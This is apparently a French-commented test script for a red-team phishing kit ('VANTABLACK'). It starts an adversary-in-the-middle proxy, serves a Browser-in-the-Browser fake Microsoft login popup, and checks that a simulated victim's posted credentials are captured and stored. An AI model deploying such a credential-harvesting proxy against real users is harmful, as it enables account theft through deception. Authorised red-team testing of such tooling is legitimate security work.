"""
test_bitb.py - Test end-to-end du module BitB (Browser-in-the-Browser)
======================================================================
1. Génère la popup pour chaque cible supportée
2. Démarre le proxy AiTM avec les routes BitB
3. Simule une victime qui submit ses credentials
4. Vérifie que les credentials sont bien capturés

Usage : source .venv/bin/activate && python test_bitb.py
"""

import sys
import time

import httpx

from core.config import Settings
from core.proxy import AdvancedRedTeamProxy


def main() -> int:
    print("=" * 70)
    print(" VANTABLACK - Test BitB (Browser-in-the-Browser)")
    print("=" * 70)

    # 1) Instanciation + démarrage du proxy AiTM
    s = Settings.from_env()
    proxy = AdvancedRedTeamProxy(s)
    proxy.start(block=False)
    time.sleep(2.5)
    print(f"[1/5] Proxy AiTM démarré sur :{proxy.settings.proxy_port}")

    # 2) Enregistrement des routes BitB sur l'app FastAPI sous-jacente
    from attack.bitb.integration import clear_captures, get_captures, register_bitb_routes
    from engine.advanced_proxy import app as advanced_app
    register_bitb_routes(advanced_app)
    print("[2/5] Routes BitB enregistrées : POST /_/bitb/capture, GET /_/bitb/popup")

    base = f"http://127.0.0.1:{proxy.settings.proxy_port}"

    # 3) Récupération de la popup Microsoft
    r = httpx.get(f"{base}/_/bitb/popup?target=microsoft", timeout=5)
    print(f"[3/5] GET /_/bitb/popup?target=microsoft -> {r.status_code}, "
          f"taille HTML = {len(r.text)} chars, "
          f"contient 'login.microsoftonline.com' ? {'login.microsoftonline.com' in r.text}")
    if r.status_code != 200:
        print("ABORT: la popup n'a pas pu être générée")
        return 1

    # 4) Simulation d'une victime qui envoie ses credentials
    r = httpx.post(
        f"{base}/_/bitb/capture",
        json={
            "campaign": "test-001",
            "target": "microsoft",
            "stage": "credentials",
            "username": "victim@entreprise.local",
            "password": "P@ssw0rd!2026",
            "ts": "2026-09-05T22:50:00Z",
            "ua": "Mozilla/5.0 (Test)",
            "href": "https://portal.entreprise.local/login"
        },
        timeout=5,
    )
    print(f"[4/5] POST /_/bitb/capture (credentials) -> {r.status_code}, body={r.text}")

    # 5) Lecture des captures stockées
    r = httpx.get(f"{base}/_/bitb/captures", timeout=5)
    data = r.json()
    print(f"[5/5] GET /_/bitb/captures -> {r.status_code}, "
          f"count={data['count']}, "
          f"username_capturé={data['captures'][0]['username'] if data['captures'] else 'aucun'}")

    # Arrêt du proxy
    proxy.stop()

    # Validation
    if data["count"] >= 1 and data["captures"][0]["username"] == "victim@entreprise.local":
        print("=" * 70)
        print(" TEST BitB RÉUSSI ✅ — La popup a été générée et le credential capturé")
        print("=" * 70)
        return 0
    else:
        print("=" * 70)
        print(" TEST BitB ÉCHOUÉ ❌")
        print("=" * 70)
        return 1


if __name__ == "__main__":
    sys.exit(main())
